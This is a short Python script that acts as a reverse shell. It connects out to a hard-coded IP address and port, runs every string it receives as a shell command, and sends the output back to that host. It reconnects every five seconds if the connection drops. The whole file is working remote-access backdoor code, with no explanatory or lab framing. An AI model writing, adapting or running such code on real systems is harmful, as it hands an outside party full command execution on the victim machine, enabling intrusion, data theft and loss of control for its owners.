import sys
import os
import subprocess
import socket
import time

# Set the host and the port.
HOST = "18.142.238.50"
PORT = 4578

def connect(address):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address[0], address[1]))
	return s

def wait_for_command(s):
	data = s.recv(1024)
	if data == "quit\n":
		s.close()
		sys.exit(0)
	elif len(data)==0:
		return True
	else:
		proc = subprocess.Popen(data, shell=True,
			stdout=subprocess.PIPE, stderr=subprocess.PIPE,
			stdin=subprocess.PIPE)
		stdout_value = proc.stdout.read() + proc.stderr.read()
		s.send(stdout_value)
		return False

def main():
	while True:
		socket_died=False
		try:
			s=connect((HOST,PORT))
			while not socket_died:
				socket_died=wait_for_command(s)
			s.close()
		except socket.error:
			pass
		time.sleep(5)

if __name__ == "__main__":

	sys.exit(main())
